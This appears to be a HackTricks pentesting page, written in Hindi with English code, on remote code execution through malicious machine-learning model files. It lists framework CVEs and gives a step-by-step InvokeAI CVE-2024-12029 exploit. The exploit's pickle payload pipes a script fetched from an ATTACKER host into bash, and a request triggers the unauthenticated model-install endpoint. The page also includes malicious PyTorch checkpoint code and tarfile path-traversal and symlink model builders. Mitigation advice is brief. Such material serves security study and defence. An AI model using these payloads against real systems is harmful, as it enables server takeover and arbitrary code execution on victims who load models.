# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning models आमतौर पर विभिन्न प्रारूपों में साझा किए जाते हैं, जैसे ONNX, TensorFlow, PyTorch, आदि। इन मॉडलों को डेवलपर्स की मशीनों या उत्पादन प्रणालियों में लोड किया जा सकता है। आमतौर पर, मॉडलों में दुर्भावनापूर्ण कोड नहीं होना चाहिए, लेकिन कुछ मामलों में मॉडल का उपयोग सिस्टम पर मनमाना कोड निष्पादित करने के लिए किया जा सकता है, जो कि एक इच्छित विशेषता या मॉडल लोडिंग लाइब्रेरी में एक भेद्यता के कारण हो सकता है।

लेखन के समय, इस प्रकार की भेद्यताओं के कुछ उदाहरण हैं:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |

इसके अलावा, कुछ पायथन पिकल आधारित मॉडल जैसे कि [PyTorch](https://github.com/pytorch/pytorch/security) द्वारा उपयोग किए जाने वाले, सिस्टम पर मनमाना कोड निष्पादित करने के लिए उपयोग किए जा सकते हैं यदि उन्हें `weights_only=True` के साथ लोड नहीं किया गया है। इसलिए, कोई भी पिकल आधारित मॉडल इस प्रकार के हमलों के प्रति विशेष रूप से संवेदनशील हो सकता है, भले ही वे ऊपर की तालिका में सूचीबद्ध न हों।

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` एक लोकप्रिय ओपन-सोर्स वेब इंटरफेस है जो Stable-Diffusion के लिए है। संस्करण **5.3.1 – 5.4.2** REST एंडपॉइंट `/api/v2/models/install` को उजागर करते हैं जो उपयोगकर्ताओं को मनमाने URLs से मॉडल डाउनलोड और लोड करने की अनुमति देता है।

आंतरिक रूप से, एंडपॉइंट अंततः कॉल करता है:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
जब प्रदान की गई फ़ाइल एक **PyTorch checkpoint (`*.ckpt`)** है, तो `torch.load` एक **pickle deserialization** करता है। चूंकि सामग्री सीधे उपयोगकर्ता-नियंत्रित URL से आती है, एक हमलावर चेकपॉइंट के अंदर एक कस्टम `__reduce__` विधि के साथ एक दुर्भावनापूर्ण ऑब्जेक्ट एम्बेड कर सकता है; यह विधि **deserialization** के दौरान निष्पादित होती है, जिससे **remote code execution (RCE)** InvokeAI सर्वर पर होती है।

इस भेद्यता को **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %) सौंपा गया था।

#### शोषण वॉक-थ्रू

1. एक दुर्भावनापूर्ण चेकपॉइंट बनाएं:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. `payload.ckpt` को एक HTTP सर्वर पर होस्ट करें जिसे आप नियंत्रित करते हैं (जैसे `http://ATTACKER/payload.ckpt`)।
3. कमजोर एंडपॉइंट को ट्रिगर करें (कोई प्रमाणीकरण आवश्यक नहीं):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. जब InvokeAI फ़ाइल डाउनलोड करता है, तो यह `torch.load()` को कॉल करता है → `os.system` गैजेट चलता है और हमलावर को InvokeAI प्रक्रिया के संदर्भ में कोड निष्पादन प्राप्त होता है।

तैयार-निर्मित एक्सप्लॉइट: **Metasploit** मॉड्यूल `exploit/linux/http/invokeai_rce_cve_2024_12029` पूरे प्रवाह को स्वचालित करता है।

#### शर्तें

•  InvokeAI 5.3.1-5.4.2 (स्कैन ध्वज डिफ़ॉल्ट **false**)
•  `/api/v2/models/install` हमलावर द्वारा पहुंच योग्य
•  प्रक्रिया को शेल कमांड निष्पादित करने की अनुमति है

#### शमन

* **InvokeAI ≥ 5.4.3** में अपग्रेड करें – पैच डिफ़ॉल्ट रूप से `scan=True` सेट करता है और डीसिरियलाइजेशन से पहले मैलवेयर स्कैनिंग करता है।
* जब चेकपॉइंट्स को प्रोग्रामेटिक रूप से लोड करें, तो `torch.load(file, weights_only=True)` या नए [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) सहायक का उपयोग करें।
* मॉडल स्रोतों के लिए अनुमति-सूचियाँ / हस्ताक्षर लागू करें और सेवा को न्यूनतम विशेषाधिकार के साथ चलाएँ।

> ⚠️ याद रखें कि **कोई भी** Python पिकल-आधारित प्रारूप (जिसमें कई `.pt`, `.pkl`, `.ckpt`, `.pth` फ़ाइलें शामिल हैं) अविश्वसनीय स्रोतों से डीसिरियलाइज करने के लिए स्वाभाविक रूप से असुरक्षित है।

---

यदि आपको पुराने InvokeAI संस्करणों को रिवर्स प्रॉक्सी के पीछे चलाना है, तो एक तात्कालिक शमन का उदाहरण:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## उदाहरण – एक दुर्भावनापूर्ण PyTorch मॉडल बनाना

- मॉडल बनाएं:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- मॉडल लोड करें:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Models to Path Traversal

जैसा कि [**इस ब्लॉग पोस्ट**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) में टिप्पणी की गई है, विभिन्न AI फ्रेमवर्क द्वारा उपयोग किए जाने वाले अधिकांश मॉडल फ़ॉर्मेट आर्काइव्स पर आधारित होते हैं, आमतौर पर `.zip`। इसलिए, इन फ़ॉर्मेट्स का दुरुपयोग करके पथ यात्रा हमलों को करना संभव हो सकता है, जिससे उस सिस्टम से मनचाहे फ़ाइलों को पढ़ने की अनुमति मिलती है जहाँ मॉडल लोड किया गया है।

उदाहरण के लिए, निम्नलिखित कोड के साथ आप एक ऐसा मॉडल बना सकते हैं जो लोड होने पर `/tmp` निर्देशिका में एक फ़ाइल बनाएगा:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
या कोड के साथ आप एक मॉडल बना सकते हैं जो लोड होने पर `/tmp` निर्देशिका के लिए एक सिम्लिंक बनाएगा:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
## References

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
